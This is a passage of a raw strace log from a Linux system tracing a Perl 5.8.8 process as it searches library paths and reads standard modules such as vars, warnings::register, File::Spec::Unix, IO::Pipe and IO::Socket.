8423  07:23:22.843705 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843720 stat64("/usr/lib/perl5/vars.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843732 stat64("/usr/lib/perl5/vars.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843745 stat64("/usr/share/perl5/vars.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843757 stat64("/usr/share/perl5/vars.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843770 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843782 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfc59f5c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843795 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfc5a04c) = -1 ENOENT (No such file or directory)
8423  07:23:22.843808 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
8423  07:23:22.843828 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
8423  07:23:22.843842 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc59d68) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.843853 _llseek(10, 0, [0], SEEK_CUR) = 0
8423  07:23:22.843870 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
8423  07:23:22.843987 stat64("/etc/perl/warnings/register.pmc", 0xbfc59b9c) = -1 ENOENT (No such file or directory)
8423  07:23:22.844003 stat64("/etc/perl/warnings/register.pm", 0xbfc59aac) = -1 ENOENT (No such file or directory)
8423  07:23:22.844017 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfc59b9c) = -1 ENOENT (No such file or directory)
8423  07:23:22.844030 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfc59aac) = -1 ENOENT (No such file or directory)
8423  07:23:22.844044 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfc59b9c) = -1 ENOENT (No such file or directory)
8423  07:23:22.844057 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfc59aac) = -1 ENOENT (No such file or directory)
8423  07:23:22.844072 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfc59b9c) = -1 ENOENT (No such file or directory)
8423  07:23:22.844085 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfc59aac) = -1 ENOENT (No such file or directory)
8423  07:23:22.844099 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfc59b9c) = -1 ENOENT (No such file or directory)
8423  07:23:22.844112 stat64("/usr/share/perl5/warnings/register.pm", 0xbfc59aac) = -1 ENOENT (No such file or directory)
8423  07:23:22.844153 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfc59b9c) = -1 ENOENT (No such file or directory)
8423  07:23:22.844181 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfc59aac) = -1 ENOENT (No such file or directory)
8423  07:23:22.844195 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfc59b9c) = -1 ENOENT (No such file or directory)
8423  07:23:22.844208 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
8423  07:23:22.844230 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
8423  07:23:22.844245 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc598b8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.844256 _llseek(11, 0, [0], SEEK_CUR) = 0
8423  07:23:22.844274 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
8423  07:23:22.844423 read(11, "", 4096) = 0
8423  07:23:22.850837 close(11)         = 0
8423  07:23:22.850919 _llseek(10, 1148, [1148], SEEK_SET) = 0
8423  07:23:22.850941 _llseek(10, 0, [1148], SEEK_CUR) = 0
8423  07:23:22.850952 close(10)         = 0
8423  07:23:22.851062 _llseek(8, 594, [594], SEEK_SET) = 0
8423  07:23:22.851077 _llseek(8, 0, [594], SEEK_CUR) = 0
8423  07:23:22.851088 close(8)          = 0
8423  07:23:22.851124 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.851182 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.851198 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.851229 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.851243 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.851256 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.851271 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.851283 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.851337 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.851350 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.851390 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.851403 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfc5a40c) = -1 ENOENT (No such file or directory)
8423  07:23:22.851417 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
8423  07:23:22.851431 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
8423  07:23:22.851453 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
8423  07:23:22.851468 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a218) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.851480 _llseek(8, 0, [0], SEEK_CUR) = 0
8423  07:23:22.851499 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
8423  07:23:22.852243 brk(0x8218000)    = 0x8218000
8423  07:23:22.852378 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
8423  07:23:22.852814 read(8, "", 4096) = 0
8423  07:23:22.852831 close(8)          = 0
8423  07:23:22.853025 read(6, "", 4096) = 0
8423  07:23:22.853040 close(6)          = 0
8423  07:23:22.853260 stat64("/etc/perl/IO/Pipe.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.853278 stat64("/etc/perl/IO/Pipe.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.853293 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.853306 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.853320 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.853333 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.853347 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.853359 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.853372 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.853384 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.853398 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.853410 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
8423  07:23:22.853432 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.853447 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.853459 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.853480 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
8423  07:23:22.854234 _llseek(6, 3425, [3425], SEEK_SET) = 0
8423  07:23:22.854253 _llseek(6, 0, [3425], SEEK_CUR) = 0
8423  07:23:22.854264 close(6)          = 0
8423  07:23:22.854288 stat64("/etc/perl/IO/Socket.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.854303 stat64("/etc/perl/IO/Socket.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.854317 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.854330 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.854344 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.854357 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.854371 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.854383 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.854401 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.854413 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfc5a8bc) = -1 ENOENT (No such file or directory)
8423  07:23:22.854427 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfc5a9ac) = -1 ENOENT (No such file or directory)
8423  07:23:22.854439 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
8423  07:23:22.854461 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
8423  07:23:22.854476 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5a6c8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.854488 _llseek(6, 0, [0], SEEK_CUR) = 0
8423  07:23:22.854505 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
8423  07:23:22.854893 stat64("/etc/perl/Socket.pmc", 0xbfc5a4fc) = -1 ENOENT (No such file or directory)
